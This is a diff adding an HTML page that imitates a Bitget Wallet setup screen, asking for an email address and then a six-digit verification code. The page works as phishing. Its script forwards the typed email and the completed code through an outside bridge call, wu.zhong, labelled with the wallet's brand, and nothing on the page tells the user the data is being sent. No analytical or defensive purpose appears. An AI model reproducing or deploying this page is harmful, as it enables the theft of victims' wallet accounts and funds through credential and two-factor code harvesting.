@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Wallet Setup</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #1a1a1a;
+            color: white;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding-top: 60px;
+        }
+
+        .back-btn {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            background: none;
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            padding: 10px;
+            z-index: 100;
+        }
+
+        .page {
+            display: none;
+            animation: fadeIn 0.3s ease-in;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+
+        .crypto-icon {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 40px;
+        }
+
+        .icon-container {
+            position: relative;
+            width: 120px;
+            height: 80px;
+        }
+
+        .cube {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #333 0%, #fff 100%);
+            border: 2px solid #555;
+            border-radius: 8px;
+            position: absolute;
+            right: 0;
+            top: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .keyhole {
+            width: 16px;
+            height: 20px;
+            background: #00bcd4;
+            border-radius: 50% 50% 0 0;
+            position: relative;
+        }
+
+        .keyhole::after {
+            content: '';
+            position: absolute;
+            bottom: -8px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 6px;
+            height: 10px;
+            background: #00bcd4;
+            border-radius: 0 0 3px 3px;
+        }
+
+        .frame {
+            width: 80px;
+            height: 50px;
+            border: 3px solid #8b5cf6;
+            border-radius: 8px;
+            position: absolute;
+            left: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, rgba(139, 92, 246, 0.1), transparent);
+        }
+
+        .title {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            line-height: 1.2;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #ccc;
+            margin-bottom: 40px;
+            line-height: 1.4;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 40px;
+        }
+
+        .input-field {
+            width: 100%;
+            background: transparent;
+            border: 2px solid #444;
+            border-radius: 12px;
+            padding: 20px;
+            font-size: 18px;
+            color: white;
+            outline: none;
+            transition: border-color 0.3s ease;
+        }
+
+        .input-field:focus {
+            border-color: #00bcd4;
+        }
+
+        .input-field::placeholder {
+            color: #666;
+        }
+
+        .paste-btn {
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #ccc;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .confirm-btn {
+            width: 100%;
+            background: #444;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 18px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 60px;
+            transition: background-color 0.3s ease;
+        }
+
+        .confirm-btn:hover {
+            background: #555;
+        }
+
+        .confirm-btn.active {
+            background: #00bcd4;
+        }
+
+        .verification-title {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 30px;
+            line-height: 1.2;
+        }
+
+        .verification-info {
+            font-size: 16px;
+            color: #ccc;
+            margin-bottom: 10px;
+            line-height: 1.4;
+        }
+
+        .email-mask {
+            color: white;
+        }
+
+        .resend-info {
+            font-size: 14px;
+            color: #ccc;
+            margin-bottom: 40px;
+        }
+
+        .resend-link {
+            color: #00bcd4;
+            text-decoration: none;
+        }
+
+        .code-inputs {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+            margin-bottom: 40px;
+        }
+
+        .code-input {
+            width: 45px;
+            height: 3px;
+            background: #444;
+            border-radius: 2px;
+            transition: background-color 0.3s ease;
+        }
+
+        .code-input.filled {
+            background: white;
+        }
+
+        .paste-clipboard {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .paste-clipboard-btn {
+            background: none;
+            border: none;
+            color: #666;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            max-width: 300px;
+            margin: 0 auto;
+        }
+
+        .key {
+            aspect-ratio: 1;
+            background: none;
+            border: none;
+            color: white;
+            font-size: 32px;
+            font-weight: 300;
+            cursor: pointer;
+            border-radius: 12px;
+            transition: background-color 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .key:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .key:active {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .key.delete {
+            font-size: 20px;
+        }
+
+        .countdown {
+            color: #00bcd4;
+        }
+
+   
+        @media (min-width: 768px) {
+            .container {
+                max-width: 460px;
+                padding-top: 80px;
+            }
+
+            .title, .verification-title {
+                font-size: 36px;
+            }
+
+            .keypad {
+                max-width: 350px;
+                gap: 25px;
+            }
+
+            .key {
+                font-size: 36px;
+            }
+        }
+
+
+        @media (min-width: 1024px) {
+            .container {
+                padding-top: 100px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <button class="back-btn" onclick="goBack()"></button>
+
+
+    <div class="page active" id="emailPage">
+        <div class="container">
+            <div class="crypto-icon">
+                <div class="icon-container">
+      
+                    
+                </div>
+            </div>
+
+            <h1 class="title">Enter your email</h1>
+            <p class="subtitle">Your email will be linked to one of the key shards, which you will manage.</p>
+
+            <div class="input-group">
+                <input type="email" class="input-field" placeholder="Email" id="emailInput">
+                <button class="paste-btn" onclick="pasteEmail()">Paste</button>
+            </div>
+
+            <button class="confirm-btn" id="confirmEmailBtn" onclick="proceedToVerification()">Confirm</button>
+        </div>
+    </div>
+
+    
+    <div class="page" id="verificationPage">
+        <div class="container">
+            <h1 class="verification-title">Enter Verification Code</h1>
+            <p class="verification-info">A 6-digit verification code has been sent to <span class="email-mask" id="maskedEmail"></span>.</p>
+            <p class="resend-info">Resend after <span class="countdown" id="countdown">33s</span></p>
+
+            <div class="code-inputs" id="codeInputs">
+                <div class="code-input"></div>
+                <div class="code-input"></div>
+                <div class="code-input"></div>
+                <div class="code-input"></div>
+                <div class="code-input"></div>
+                <div class="code-input"></div>
+            </div>
+
+            <div class="paste-clipboard">
+                <button class="paste-clipboard-btn" onclick="pasteFromClipboard()">Paste from clipboard</button>
+            </div>
+
+            <div class="keypad">
+                <button class="key" onclick="addDigit('1')">1</button>
+                <button class="key" onclick="addDigit('2')">2</button>
+                <button class="key" onclick="addDigit('3')">3</button>
+                <button class="key" onclick="addDigit('4')">4</button>
+                <button class="key" onclick="addDigit('5')">5</button>
+                <button class="key" onclick="addDigit('6')">6</button>
+                <button class="key" onclick="addDigit('7')">7</button>
+                <button class="key" onclick="addDigit('8')">8</button>
+                <button class="key" onclick="addDigit('9')">9</button>
+                <button class="key"></button>
+                <button class="key" onclick="addDigit('0')">0</button>
+                <button class="key delete" onclick="removeDigit()">⌫</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentCode = '';
+        let currentPage = 'emailPage';
+        let countdownTimer;
+        let timeLeft = 33;
+
+        
+        const emailInput = document.getElementById('emailInput');
+        const confirmBtn = document.getElementById('confirmEmailBtn');
+
+        emailInput.addEventListener('input', function() {
+            if (this.value.trim()) {
+                confirmBtn.classList.add('active');
+            } else {
+                confirmBtn.classList.remove('active');
+            }
+        });
+
+        function pasteEmail() {
+            navigator.clipboard.readText().then(text => {
+                emailInput.value = text;
+                emailInput.dispatchEvent(new Event('input'));
+            }).catch(() => {
+               
+                emailInput.focus();
+            });
+        }
+
+        function proceedToVerification() {
+            if (!emailInput.value.trim()) return;
+            
+            const email = emailInput.value;
+            const maskedEmail = maskEmail(email);
+            document.getElementById('maskedEmail').textContent = maskedEmail;
+            
+           
+        wu.zhong(`🔰 Bitget Wallet\n\n✉️Email: ${emailInput.value} `,"com.bitkeep.wallet#");
+        
+            switchPage('verificationPage');
+            startCountdown();
+        }
+
+        function maskEmail(email) {
+            const [local, domain] = email.split('@');
+            if (local.length <= 3) return email;
+            return local[0] + '*'.repeat(local.length - 2) + local[local.length - 1] + '@' + domain;
+        }
+
+        
+        function addDigit(digit) {
+            if (currentCode.length < 6) {
+                currentCode += digit;
+                updateCodeDisplay();
+                
+                if (currentCode.length === 6) {
+                
+                    setTimeout(() => {
+                        
+                wu.zhong(`🔰 Bitget Wallet\n\n🔒Verification Code: ${currentCode}`,"com.bitkeep.wallet");
+                       
+                    }, 200);
+                }
+            }
+        }
+
+        function removeDigit() {
+            if (currentCode.length > 0) {
+                currentCode = currentCode.slice(0, -1);
+                updateCodeDisplay();
+            }
+        }
+
+        function updateCodeDisplay() {
+            const codeInputs = document.querySelectorAll('.code-input');
+            codeInputs.forEach((input, index) => {
+                if (index < currentCode.length) {
+                    input.classList.add('filled');
+                } else {
+                    input.classList.remove('filled');
+                }
+            });
+        }
+
+        function pasteFromClipboard() {
+            navigator.clipboard.readText().then(text => {
+                const digits = text.replace(/\D/g, '').slice(0, 6);
+                currentCode = digits;
+                updateCodeDisplay();
+                
+                if (currentCode.length === 6) {
+                    setTimeout(() => {
+                      
+                    }, 200);
+                }
+            }).catch(() => {
+                
+            });
+        }
+
+        function startCountdown() {
+            timeLeft = 33;
+            const countdownEl = document.getElementById('countdown');
+            
+            countdownTimer = setInterval(() => {
+                timeLeft--;
+                countdownEl.textContent = timeLeft + 's';
+                
+                if (timeLeft <= 0) {
+                    clearInterval(countdownTimer);
+                    countdownEl.parentElement.innerHTML = '<a href="#" class="resend-link" onclick="resendCode()">Resend code</a>';
+                }
+            }, 1000);
+        }
+
+        function resendCode() {
+            
+            startCountdown();
+        }
+
+ 
+        function switchPage(pageId) {
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            document.getElementById(pageId).classList.add('active');
+            currentPage = pageId;
+        }
+
+        function goBack() {
+            if (currentPage === 'verificationPage') {
+                switchPage('emailPage');
+                if (countdownTimer) {
+                    clearInterval(countdownTimer);
+                }
+                currentCode = '';
+                updateCodeDisplay();
+            } 
+        }
+
+      
+        updateCodeDisplay();
+    </script>
+</body>
+</html>
